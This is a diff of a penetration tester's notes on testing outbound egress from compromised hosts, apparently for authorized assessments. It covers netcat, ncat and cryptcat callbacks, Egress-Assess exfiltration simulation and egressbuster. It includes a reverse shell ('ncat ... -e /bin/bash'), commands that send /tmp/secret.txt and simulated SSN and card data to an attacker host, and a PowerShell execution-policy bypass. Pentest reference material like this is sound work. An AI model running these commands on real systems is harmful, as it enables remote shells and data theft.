@@ -1,69 +1,146 @@
 Egress
 
 
-target - Ubuntu     10.0.0.10
-target2 - Windows   10.0.0.11
-attacker            10.0.0.5
+# Overview
 
-# netcat
-target              nc 10.0.0.5 80
-attacker            nc -lvp 80
+Test outbound connectivity and protocol egress from compromised hosts. Use only on authorized assessments — exfil simulation can trigger DLP and ISP blocks.
 
-# ncat
-target              ncat 10.0.0.5 --ssl -e /bin/bash
-attacker            ncat -l 443 --ssl
 
-# cryptcat
-target              cryptcat 10.0.0.5 80 -k password
-attacker            cryptcat -lvp 80 -k password
+# Related Notes
 
-# Egress-Assess
+pwk.txt                    Netcat, socat, and reverse-shell fundamentals
+linux.txt                  Linux callbacks and ncat usage
+windows.txt                Windows egress and SMB context
+smtp.txt                   SMTP testing — port 25 often blocked by ISPs
+kali.txt                   Discover install via misc/update.sh
 
-Works as a client/server model.
 
-./Egress-Assess.py -h
-./Egress-Assess.py --list-clients        dns, dns_resolved, ftp, http, https, icmp, sftp, smb, smtp
-./Egress-Assess.py --list-servers        dns, ftp, http, https, icmp, sftp, smb, smtp
-./Egress-Assess.py --list-actors         darkhotel, etumbot, putterpanda, zeus
-./Egress-Assess.py --list-datatypes      cc, identity, ni, ssn
+# Contents
 
-- Server
-./Egress-Assess.py --server <payload & options>
-./Egress-Assess.py --server http --server-port 8000
+Lab Topology, Simple Callbacks, Egress-Assess Setup, Egress-Assess HTTP, Egress-Assess HTTPS,
+Egress-Assess FTP, PowerShell Client, egressbuster, Validation / False Positives
 
-- Client
-./Egress-Assess.py --client <payload & options> --ip <server> --datatype <cc or ssn> --data-size <# of MB>
-./Egress-Assess.py --client http --client-port 8000 --ip <server> --file /tmp/secret.txt
-./Egress-Assess.py --client http --client-port 8000 --ip <server> --datatype cc --data-size 5
+
+# Lab Topology
+
+target  — Ubuntu          <target IP>
+target2 — Windows         <windows target IP>
+attacker                    <attacker IP>
+
+
+# Simple Callbacks
+
+## Overview
+
+Quick outbound connectivity checks. Fuller netcat workflows in pwk.txt.
+
+## Commands
+
+netcat:
+    target:   nc <attacker IP> 80
+    attacker: nc -lvp 80
+
+ncat:
+    target:   ncat <attacker IP> --ssl -e /bin/bash
+    attacker: ncat -l 443 --ssl
+
+cryptcat:
+    target:   cryptcat <attacker IP> 80 -k password
+    attacker: cryptcat -lvp 80 -k password
+
+
+# Egress-Assess Setup
+
+## Overview
+
+Client/server exfil simulation. Installed by misc/update.sh.
+
+## Commands
+
+    /opt/Egress-Assess/
+    /opt/Egress-Assess-venv/bin/python Egress-Assess.py -h
+
+    ./Egress-Assess.py --list-clients        dns, dns_resolved, ftp, http, https, icmp, sftp, smb, smtp
+    ./Egress-Assess.py --list-servers        dns, ftp, http, https, icmp, sftp, smb, smtp
+    ./Egress-Assess.py --list-actors         darkhotel, etumbot, putterpanda, zeus
+    ./Egress-Assess.py --list-datatypes      cc, identity, ni, ssn
 
 Transferred data is stored in data/.
 
-Example 2
-- Server
-./Egress-Assess.py --server https
 
-- Client
-./Egress-Assess.py --client https --ip <server> --file /tmp/secret.txt
-./Egress-Assess.py --client https --ip <server> --datatype ssn --data-size 5
+# Egress-Assess HTTP
 
-Example 3
-- Server
-./Egress-Assess.py --server ftp --username lee --password hack
+## Commands
 
-- Client
-./Egress-Assess.py --client ftp --username lee --password hack --file /tmp/secret.txt
-./Egress-Assess.py --client ftp --username lee --password hack --datatype identity --data-size 5
+Server:
+    ./Egress-Assess.py --server http --server-port 8000
 
-- PowerShell version can only be used as a client.
-Its not a one-for-one port. Not all options are the same.
-Be sure to use a single dash instead of a double.
+Client:
+    ./Egress-Assess.py --client http --client-port 8000 --ip <server> --file /tmp/secret.txt
+    ./Egress-Assess.py --client http --client-port 8000 --ip <server> --datatype cc --data-size 5
 
-powershell -nop -exec bypass
-Import-Module .\EgressAssess.ps1
 
-Invoke-EgressAssess -Client http -Port 8000 -IP <server> -Datatype "c:\Users\lee\secret.txt"
-Invoke-EgressAssess -Client http -Port 8000 -IP <server> -Datatype ni -Size 5 -Fast
+# Egress-Assess HTTPS
 
-Invoke-EgressAssess -Client ftp -IP <server> -Username lee -Password hack -Datatype "c:\Users\lee\secret.txt"
+## Commands
 
-Note: Comcast blocks port 25 and 445. If you are testing smtp or smb, use alternate ports.
+Server:
+    ./Egress-Assess.py --server https
+
+Client:
+    ./Egress-Assess.py --client https --ip <server> --file /tmp/secret.txt
+    ./Egress-Assess.py --client https --ip <server> --datatype ssn --data-size 5
+
+
+# Egress-Assess FTP
+
+## Commands
+
+Server:
+    ./Egress-Assess.py --server ftp --username lee --password hack
+
+Client:
+    ./Egress-Assess.py --client ftp --username lee --password hack --file /tmp/secret.txt
+    ./Egress-Assess.py --client ftp --username lee --password hack --datatype identity --data-size 5
+
+
+# PowerShell Client
+
+## Overview
+
+PowerShell module is client-only — not a one-for-one port of the Python CLI. Use single-dash parameters.
+
+## Commands
+
+    powershell -nop -exec bypass
+    Import-Module .\EgressAssess.ps1
+
+    Invoke-EgressAssess -Client http -Port 8000 -IP <server> -Datatype "c:\Users\lee\secret.txt"
+    Invoke-EgressAssess -Client http -Port 8000 -IP <server> -Datatype ni -Size 5 -Fast
+
+    Invoke-EgressAssess -Client ftp -IP <server> -Username lee -Password hack -Datatype "c:\Users\lee\secret.txt"
+
+
+# egressbuster
+
+## Overview
+
+Outbound port discovery to a listener. Installed at /opt/egressbuster via misc/update.sh. Listener requires Linux (iptables).
+
+## Commands
+
+Attacker (Linux):
+    cd /opt/egressbuster
+    python3 egress_listener.py
+
+Target:
+    python3 egressbuster.py <attacker IP>
+
+
+# Validation / False Positives
+
+Comcast and many ISPs block outbound 25 and 445 — use alternate ports for SMTP and SMB egress tests.
+Firewall allow on one port does not imply full egress — test the protocol you need for the engagement.
+Egress-Assess success in lab does not map 1:1 to real DLP/proxy environments — document protocol and port tested.
+PowerShell -Datatype may accept file paths differently than Python --file — verify on target before relying on syntax.
+Blocked callback to <attacker IP> may be egress filtering, wrong listener port, or host firewall — confirm listener with a known-good port first.
